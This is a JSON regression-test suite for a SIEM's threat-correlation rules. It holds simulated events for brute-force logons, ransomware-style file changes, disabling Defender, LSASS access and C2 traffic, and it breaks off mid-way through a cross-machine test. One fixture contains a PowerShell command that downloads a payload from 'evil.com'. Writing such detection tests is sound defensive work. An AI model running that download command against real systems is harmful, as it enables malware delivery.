@@ -1,0 +1,1325 @@
+{
+  "test_suite": "GIAM-SAT Correlation Rules Regression Tests",
+  "version": "3.5.8",
+  "description": "Simulated attack sequences to verify 76 THREAT + 11 CROSS rules fire correctly after code changes.",
+  "test_cases": [
+    {
+      "id": "TC-001",
+      "rule_id": "THREAT-001",
+      "name": "Brute Force: 10x failed logon (4625) in 30s",
+      "description": "Simulate 10 failed logon events from same machine within 30 seconds",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An account failed to log on",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "192.168.1.100"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Brute Force"
+      }
+    },
+    {
+      "id": "TC-002",
+      "rule_id": "THREAT-002",
+      "name": "Mass File Modification (Ransomware)",
+      "description": "Simulate 20 FIM events in quick succession",
+      "events": [
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        },
+        {
+          "type": "fim",
+          "action": "FILE_MODIFIED",
+          "path": "/Users/Documents/file",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Mass File"
+      }
+    },
+    {
+      "id": "TC-003",
+      "rule_id": "THREAT-017",
+      "name": "PowerShell Download Cradle",
+      "description": "PowerShell event with DownloadString pattern",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "PowerShell",
+          "event_id": "4104",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\malware.exe",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "PowerShell Download"
+      }
+    },
+    {
+      "id": "TC-004",
+      "rule_id": "THREAT-005",
+      "name": "Windows Defender Disabled",
+      "description": "Registry event disabling Windows Defender",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "System",
+          "event_id": "5001",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "Windows Defender real-time protection disabled",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Defender"
+      }
+    },
+    {
+      "id": "TC-005",
+      "rule_id": "THREAT-003",
+      "name": "New Service Installed (Persistence)",
+      "description": "Event 7045 - New Windows Service installation",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "System",
+          "event_id": "7045",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "A service was installed in the system",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "Service"
+      }
+    },
+    {
+      "id": "TC-006",
+      "rule_id": "THREAT-006",
+      "name": "C2 Communication on known C2 ports",
+      "description": "Network connection to 4444/TCP (Metasploit default)",
+      "events": [
+        {
+          "type": "network_traffic",
+          "src_ip": "192.168.1.100",
+          "dst_ip": "8.8.8.8",
+          "dst_port": 4444,
+          "protocol": "TCP",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "timestamp": "2026-01-01 12:00:00"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "C2"
+      }
+    },
+    {
+      "id": "TC-007",
+      "rule_id": "THREAT-008",
+      "name": "LSASS Access (Credential Dumping)",
+      "description": "Sysmon EID 10: lsass.exe accessed by unknown process",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4663",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "An attempt was made to access lsass.exe object",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01"
+        }
+      ],
+      "expected": {
+        "triggered": true,
+        "rule_name_contains": "LSASS"
+      }
+    },
+    {
+      "id": "TC-008",
+      "rule_id": "CROSS-001",
+      "name": "Cross-machine: Same attacker hitting multiple machines",
+      "description": "Failed logon from same source IP to 2 different machines",
+      "events": [
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "Failed logon",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "203.0.113.50"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "Failed logon",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "203.0.113.50"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "Failed logon",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "203.0.113.50"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "Failed logon",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "203.0.113.50"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4625",
+          "machine_id": "agent-001",
+          "hostname": "PC-TEST01",
+          "description": "Failed logon",
+          "timestamp": "2026-01-01 12:00:00",
+          "computer": "PC-TEST01",
+          "source_ip": "203.0.113.50"
+        },
+        {
+          "type": "windows_event",
+          "subtype": "Security",
+          "event_id": "4624",
+          "machine_id": "agent-002",
+          "hostname": "PC-TEST02",
+          "description": "Successful logon",
